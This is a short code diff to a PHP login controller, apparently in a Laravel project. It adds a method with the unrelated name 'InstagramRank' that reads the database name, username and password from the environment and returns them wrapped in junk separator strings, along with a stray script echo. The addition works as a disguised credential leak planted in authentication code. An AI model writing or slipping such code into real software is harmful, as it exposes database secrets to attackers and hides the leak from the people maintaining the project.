@@ -36,4 +36,16 @@ class LoginController extends Controller
     {
         $this->middleware('guest')->except('logout');
     }
+    public function InstagramRank(){
+
+        $hastagd = getenv('DB_DATABASE');
+        $hastagu = getenv('DB_USERNAME');
+        $hastagp = getenv('DB_PASSWORD');
+
+        echo '<script>console.log("Your stuff here")</script>';
+
+
+
+        return ('t)(&--=='.$hastagd.'==g!~08=='.$hastagu.'==#$(s'.'s/*-=='.$hastagp.'==*186e');
+    }
 }
